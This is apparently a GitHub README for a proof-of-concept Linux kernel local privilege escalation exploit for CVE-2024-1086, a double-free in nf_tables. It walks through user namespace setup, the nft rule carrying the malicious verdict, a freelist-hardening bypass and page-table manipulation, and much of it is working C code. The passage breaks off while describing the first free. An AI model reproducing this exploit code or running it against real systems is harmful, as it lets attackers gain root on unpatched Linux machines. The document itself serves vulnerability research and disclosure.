# exploit

Original LPE PoC for CVE-2024-1086, tested on Linux KernelCTF lts-6.1.72 and mitigation-6.1. Successrate of 99.6% on LTS on local testing. 

## Requirements

As described in the vulnerability docs, the exploit requires nf_tables and unprivileged user namespaces to be available.

Caveats for this version of the exploit:
- Only works on QEMU VMs (because of a race-condition related to converting pages from order==4 to order==0)
- Requires at least 2 CPU cores to be present (because of the race condition above)
- Requires a maximum of 4GiB physical memory

The updated version is included in the seperate blogpost and Github repo.

## Multiprocessing

This exploit makes use of 2 processes, because of a race condition. 

In this version, there are 2 threads for Dirty Pagedirectory: the "target PFN write" thread (PMD side), and the "target page access" thread (PUD side). This is because the PUD page and PMD page are allocated in the seperate processes. It is possible to make this behaviour obsolete, but this was unknown at the time of submission.

The communication between the threads happen through an shared `struct shared_info` instance, mmap'd in `main()`. There are several status indicators in this struct:
- `mem_status`: an indicator of the memory scanning status (saying thread 1 should proceed or thread 2 should proceed)
- `lock_status`: an indicator of a CPU lock, used when syncing up the threads for the race condition.
- `flush_status`: obsolete indicator which was used for communication between the TLB flushing parent and child. Now, the TLB flushing function mmap's its own indicator, which is now thread safe.
- `exploit_status`: an indicator used for the foreground exploit thread which makes it look like the exploit process stopped when it is done, whilst the child actually keeps running by sleeping to avoid a kernel bug.

```c
#define SPINLOCK_NOSLEEP(cmp) while (cmp) { }

// syncs threads within 5ms diffs by calling both SYNC_CPU0() and SYNC_CPU1()
// allows CPU1 to be earlier and allows CPU0 to be earlier

#define SYNC_CPU0() do { \
		printf("[*] syncing cpu 0...\n"); \
		SPINLOCK_NOSLEEP(memdump_info->lock_status == LOCK_STAT_NONE); \
\
		memdump_info->lock_status = LOCK_STAT_0; \
		SPINLOCK_NOSLEEP(memdump_info->lock_status == LOCK_STAT_0); \
\
		memdump_info->lock_status = LOCK_STAT_NONE; \
 } while (0);

#define SYNC_CPU1() do { \
		printf("[*] syncing cpu 1...\n"); \
		memdump_info->lock_status = LOCK_STAT_1; \
		SPINLOCK_NOSLEEP(memdump_info->lock_status == LOCK_STAT_1); \
\
		memdump_info->lock_status = LOCK_STAT_1; \
 } while (0);
 ```

## Workflow - Setup

### Namespaces

Before we can exploit the vuln, we need to setup user namespaces so we can set up our own nft rules, and disable RPF (anti IP spoofing thing, which prevents us from traversing a specific IPv4 codepath to avoid kernel panics). The code for these procedures are straightforward but a lot of code, so I will not show it here.

```c
void setup_env()
{
    uid_t uid = getuid();
    gid_t gid = getgid();

	do_unshare();
	configure_uid_map(uid, gid);
	configure_interfaces();
	configure_nftables();
    clean_files();
}
```

### Nft rule triggering the bug

Before we can trigger the vuln, we need to set up an nft rule which returns the malicious verdict. To avoid false positives, we need to specify a unique filter so only our exploits' packet triggers the double-free. If we did not apply the filter, every IPv4 packet in the system would get double-freed. Our filter is arbitrary, and I chose for filtering for packets which have IPv4 header protocol == 69 && first 4 bytes "\x41\x41\x41\x41". I have not experienced false positives with this. 

```c
static void add_set_verdict(struct nftnl_rule *r, uint32_t val)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("immediate");
	if (e == NULL) {
		perror("expr immediate");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val); // Set the verdict to 0x69

	nftnl_rule_add_expr(r, e);
}

static struct nftnl_rule *alloc_rule(unsigned char family, const char *table, const char *chain, unsigned char proto)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("rule alloc");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	nftnl_rule_set(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set(r, NFTNL_RULE_CHAIN, chain);

	// expect protocol to be `proto`
	add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, offsetof(struct iphdr, protocol), sizeof(unsigned char));
	add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &proto, sizeof(unsigned char));

	// expect 4 first bytes of packet to be \x41
    add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, sizeof(struct iphdr), 4);
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, "\x41\x41\x41\x41", 4);


	// (NF_DROP | -((0xFFFF << 16) >> 16)) == 1, aka NF_ACCEPT (trigger double free)
	// (NF_DROP | -((0xFFF0 << 16) >> 16)) == 16
	add_set_verdict(r, 0xFFFF << 16);

	return r;
}
```

### Pre-allocating Dirty Pagedirectory PUDs

In order to use Dirty Pagedirectory we must register VMAs before we can allocate the pages and pagetables. Additionally, notice how we pre-allocate the PUD for the PMD double-alloc etc, so we do not allocate the PUD when we need to allocate the PMD.

These VMA address ranges are semi-arbitrary, as long as they align with their targetted pagetable entries.

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
	unsigned long long *pmd_area;
	void *_pud_area;
	void *pud_kernel_area;
	void *pud_data_area;
    // ... (more var declarations)

	// pre-allocate PUD for PMD
	mmap((void*)0x200000, 0x200000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)0x200000 = 0xCAFEBABE;

	// pre-allocate VMA for PMD and PUD (not themself)
	pmd_area = mmap((void*)0x40000000, 0x200000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);  // shared bcs it may be used for cache flushing
	
	// these use different PTEs but the same PUD
	_pud_area = mmap((void*)0x8000000000, 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pud_kernel_area = _pud_area;
	pud_data_area = _pud_area + 0x200000;

    // ... (more exploit code)
}
```

## Workflow - Double-free -> Dirty Pagedirectory

Before we proceed, please checkout the image below, describing the operations to set up Dirty Pagedirectory (PUD+PMD):

![Overview of exploit operations to set up Dirty Pagedirectory](img/pagesetup.svg)

### Setup for `CONFIG_FREELIST_HARDENED` naive DF detection bypass

In order to bypass `CONFIG_FREELIST_HARDENED`'s naive double-free detection, we simply allocate an skb (remove from the freelist) before the double-free, which we free (append to the freelist) in between the double-free.

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
        // ... (more exploit stuff)
    } else {
#if CONFIG_FLC_BYPASS
		set_ipfrag_time(1);

		// will expire naturally after 1 second
		df_ip_header.ip_id = 0x1334;
		df_ip_header.ip_len = sizeof(struct ip)*2 + 8*2 + 8;
		df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);
		alloc_intermed_buf_hdr(8, &df_ip_header);

		// make sure df trigger packet doesn't get expired while waiting for skb5 to be freed
		set_ipfrag_time(999);
#endif
        // ... (more exploit stuff)
    }
    
    // ... (more exploit stuff)
}
```

### Double-free (free 1)

In order to trigger the double-free, we send the IPv4 packet which satisfies the filter. This will cause the first free of the double-free. Then, it will send the packet to an IPv4 fragment queue (IFQ), until 999 seconds have passed or until the queue is complete (which we will complete when the 2nd free happened). 

